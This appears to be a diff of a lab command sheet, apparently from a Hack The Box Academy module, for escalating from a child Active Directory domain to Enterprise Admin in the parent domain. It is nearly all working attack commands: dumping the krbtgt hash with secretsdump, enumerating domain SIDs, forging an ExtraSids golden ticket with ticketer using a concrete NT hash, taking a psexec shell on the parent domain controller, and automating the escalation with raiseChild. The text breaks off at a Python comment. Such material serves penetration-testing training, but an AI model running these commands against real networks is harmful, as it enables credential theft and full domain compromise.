@@ -6,43 +6,29 @@
 
 > Terminal output is omitted; only commands & scripts are captured.
 
-## 1. `shellsession` _(output omitted)_
-
 ```bash
 secretsdump.py logistics.{{DOMAIN}}/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
 ```
-
-## 2. `shellsession` _(output omitted)_
 
 ```bash
 lookupsid.py logistics.{{DOMAIN}}/htb-student_adm@172.16.5.240 
 ```
 
-## 3. `shellsession` _(output omitted)_
-
 ```bash
 lookupsid.py logistics.{{DOMAIN}}/htb-student_adm@172.16.5.240 | grep "Domain SID"
 ```
-
-## 4. `shellsession` _(output omitted)_
 
 ```bash
 lookupsid.py logistics.{{DOMAIN}}/htb-student_adm@{{DC_IP}} | grep -B12 "Enterprise Admins"
 ```
 
-## 5. `shellsession` _(output omitted)_
-
 ```bash
 ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.{{DOMAIN_UPPER}} -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
 ```
 
-## 6. `shellsession`
-
 ```bash
 export KRB5CCNAME=hacker.ccache
 ```
-
-## 7. `shellsession` _(output omitted)_
 
 ```bash
 psexec.py LOGISTICS.{{DOMAIN_UPPER}}/hacker@academy-ea-dc01.{{DOMAIN}} -k -no-pass -target-ip {{DC_IP}}
@@ -50,15 +36,11 @@ whoami
 hostname
 ```
 
-## 8. `shellsession` _(output omitted)_
-
 ```bash
 raiseChild.py -target-exec {{DC_IP}} LOGISTICS.{{DOMAIN_UPPER}}/htb-student_adm
 whoami
 exit
 ```
-
-## 9. `python`
 
 ```python
 #   The workflow is as follows:
